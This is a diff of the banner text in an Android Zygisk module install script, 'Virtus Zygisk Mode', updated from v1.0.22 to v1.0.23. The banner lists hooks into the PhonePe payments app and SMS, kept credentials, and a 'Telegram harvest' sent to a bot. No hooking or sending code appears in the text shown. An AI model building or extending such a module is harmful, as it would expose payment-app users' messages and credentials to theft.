@@ -3,14 +3,15 @@
 
 ui_print "*******************************"
 ui_print "   Virtus Zygisk Mode           "
-ui_print "     v1.0.22 TG TEST FIX         "
-ui_print "  Save → Telegram test message  "
-ui_print "  SMS hooks in postSpecialize   "
-ui_print "  Bubble deferred · creds keep  "
+ui_print "     v1.0.23 CRASH+TG FIX        "
+ui_print "  PhonePe JNI-only (no PLT)     "
+ui_print "  Save → app files (SELinux OK) "
+ui_print "  Telegram harvest + test       "
 ui_print "  @Hivirtus                     "
 ui_print "*******************************"
-ui_print "! PhonePe open → bubble → Telegram"
-ui_print "! Token+Chat ID → Save → test aayega"
+ui_print "! Flash → reboot → PhonePe"
+ui_print "! Save again → TG test check"
+ui_print "! Channel chat: bot must be admin"
 
 if [ -z "$MODPATH" ]; then
   ui_print "! ERROR: MODPATH not set"
